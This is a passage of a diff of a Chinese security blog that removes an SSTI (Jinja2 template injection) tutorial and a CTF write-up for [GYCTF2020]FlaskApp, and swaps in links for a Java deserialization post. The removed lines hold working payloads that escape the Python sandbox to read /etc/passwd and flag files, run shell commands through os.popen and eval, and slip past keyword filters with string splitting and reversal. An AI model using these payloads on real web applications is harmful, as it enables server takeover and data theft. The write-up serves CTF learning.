-<pre class="language-python" data-language="python"><code class="language-python">&#123;%if	sub.__name__&#x3D;&#x3D;&#39;catch_warnings&#39;%&#125;</code></pre>
-<p>要利用&lt;class ‘warnings.catch_warnings’&gt;来调用eval os等命令<br>&lt;class ‘warnings.catch_warnings’&gt;<br>一般位置为59，可以用它来调用file、os、eval、commands等</p>
-<p>调用file</p>
-<pre class="language-python" data-language="python"><code class="language-python">&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read()      #把 read() 改为 write() 就是写文件</code></pre>
-
-<p>import os</p>
-<pre class="language-python" data-language="python"><code class="language-python">[].__class__.__base__.__subclasses__()[189].__init__.__globals__[&#39;__builtins__&#39;][&#39;__imp&#39;+&#39;ort__&#39;](&#39;os&#39;).__dict__[&#39;pop&#39;+&#39;en&#39;](&#39;ls &#x2F;&#39;).read()
-</code></pre>
-
-<p>调用eval</p>
-<pre class="language-python" data-language="python"><code class="language-python">[].__class__.__base__.__subclasses__()[59].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&quot;)
-
-[].__class__.__base__.__subclasses__()[189].__init__.__globals__[&#39;__builtins__&#39;][&#39;ev&#39;+&#39;al&#39;](&#39;__imp&#39;+&#39;ort__(&quot;os&quot;).po&#39;+&#39;pen(&quot;ls .&#x2F;&quot;).read()&#39;)
-</code></pre>
-
-<p>调用system方法。（不包含system，可以绕过过滤system的情况）</p>
-<pre class="language-python" data-language="python"><code class="language-python">[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].__dict__.values()[12].__dict__.values()[144](&#39;whoami&#39;)</code></pre>
-
-<p>利用commands进行命令执行</p>
-<pre class="language-python" data-language="python"><code class="language-python">&#123;&#125;.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;commands&#39;).getstatusoutput(&#39;ls&#39;)&#125;&#125;
-</code></pre>
-
-
-
-
-
-<h3 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h3><p>在学了在学了（</p>
-<h3 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h3><p>题目里有base64加密、解密和一个提示页面，试一下就可以知道解密框存在ssti注入，且当报错时会进入debug模式在这里可以看到一部分源码</p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210629011031131.png" alt="image-20210629011031131"></p>
-<p>试着访问app。py</p>
-<pre class="language-python" data-language="python"><code class="language-python">&#123;% for i in &#39;&#39;.__class__.__base__.__subclasses__() %&#125;&#123;% if i.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; i.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;app.py&#39;,&#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre>
-
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210629002905912.png" alt="image-20210629002905912"></p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210629002847559.png" alt="image-20210629002847559"></p>
-<p>这里可以看到过滤了一些内容</p>
-<p>再查找目录内内容</p>
-<pre class="language-python" data-language="python"><code class="language-python">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;][&#39;__imp&#39;+&#39;ort__&#39;](&#39;o&#39;+&#39;s&#39;).listdir(&#39;&#x2F;&#39;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre>
-
-<p>os.listdir() 方法用于返回指定的文件夹包含的文件或文件夹的名字的列表。</p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210629003200355.png" alt="image-20210629003200355"></p>
-<p>看见一个this_is_the_flag.txt</p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210629003236918.png" alt="image-20210629003236918"></p>
-<p>尝试去访问,得到flag</p>
-<pre class="language-python" data-language="python"><code class="language-python">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;%if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;
-&#123;&#123;c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;&#x2F;this_is_the_f&#39;+&#39;lag.txt&#39;,&#39;r&#39;).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre>
-
-<p>也可以利用切片的方式</p>
-<pre class="language-python" data-language="python"><code class="language-python">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;txt.galf_eht_si_siht&#x2F;&#39;[::-1],&#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre>
-
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210629010815862.png" alt="image-20210629010815862"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230319155736513.png" alt="image-20230319155736513"></p>
+<p>然后以post方式提交就行了</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230319155752794.png" alt="image-20230319155752794"></p>
 
                 
             </div>
@@ -788,7 +698,7 @@ _&#96;是&#96;\x5f&#96;，&#96;.&#96;是&#96;\x2E</code></pre>
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://Ethe448.github.io/2021/06/25/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/">https://Ethe448.github.io/2021/06/25/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</a>
+                    <a href="https://Ethe448.github.io/2023/03/18/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BURLDNS/">https://Ethe448.github.io/2023/03/18/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BURLDNS/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -830,8 +740,12 @@ _&#96;是&#96;\x5f&#96;，&#96;.&#96;是&#96;\x2E</code></pre>
                                     <span class="chip bg-color">web学习</span>
                                 </a>
                             
-                                <a href="/tags/ssti%E6%B3%A8%E5%85%A5/">
-                                    <span class="chip bg-color">ssti注入</span>
+                                <a href="/tags/Java/">
+                                    <span class="chip bg-color">Java</span>
+                                </a>
+                            
+                                <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+                                    <span class="chip bg-color">反序列化</span>
                                 </a>
                             
                         </div>
@@ -1275,25 +1189,24 @@ _&#96;是&#96;\x5f&#96;，&#96;.&#96;是&#96;\x2E</code></pre>
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2021/06/30/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+                <a href="/2023/03/19/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections/">
                     <div class="card-image">
                         
                         
-                        <img src="https://epicture.oss-cn-beijing.aliyuncs.com/medias/featureimages/10.jpg" class="responsive-img" alt="反序列化">
+                        <img src="https://epicture.oss-cn-beijing.aliyuncs.com/medias/featureimages/20.jpg" class="responsive-img" alt="Java反序列化之CommonsCollections">
                         
-                        <span class="card-title">反序列化</span>
+                        <span class="card-title">Java反序列化之CommonsCollections</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            基础知识php的序列化和反序列化主要是通过serialize和unserialize两个函数
-serialize()将一个对象转换成一个字符串，unserialize()将字符串还原为一个对象，对反序列化进行利用也主要是通过其中的魔术方法
+                            
                         
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-06-30
+                            <i class="far fa-clock fa-fw icon-date"></i>2023-03-19
                         </span>
                         <span class="publish-author">
                             
@@ -1308,6 +1221,10 @@ serialize()将一个对象转换成一个字符串，unserialize()将字符串�
                     
                     <a href="/tags/web%E5%AD%A6%E4%B9%A0/">
                         <span class="chip bg-color">web学习</span>
+                    </a>
+                    
+                    <a href="/tags/Java/">
+                        <span class="chip bg-color">Java</span>
                     </a>
                     
                     <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
@@ -1325,24 +1242,24 @@ serialize()将一个对象转换成一个字符串，unserialize()将字符串�
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">
+                <a href="/2023/03/16/Java/">
                     <div class="card-image">
                         
                         
-                        <img src="https://epicture.oss-cn-beijing.aliyuncs.com/medias/featureimages/17.jpg" class="responsive-img" alt="buu刷题记录">
+                        <img src="https://epicture.oss-cn-beijing.aliyuncs.com/medias/featureimages/6.jpg" class="responsive-img" alt="Java">
                         
-                        <span class="card-title">buu刷题记录</span>
+                        <span class="card-title">Java</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            记录一下自己buu的刷题进度，留下点wp方便以后看
+                            
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-06-17
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-03-16
                             </span>
                         <span class="publish-author">
                             
@@ -1355,8 +1272,12 @@ serialize()将一个对象转换成一个字符串，unserialize()将字符串�
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/ctf/">
-                        <span class="chip bg-color">ctf</span>
+                    <a href="/tags/web%E5%AD%A6%E4%B9%A0/">
+                        <span class="chip bg-color">web学习</span>
+                    </a>
+                    
+                    <a href="/tags/Java/">
+                        <span class="chip bg-color">Java</span>
                     </a>
                     
                 </div>
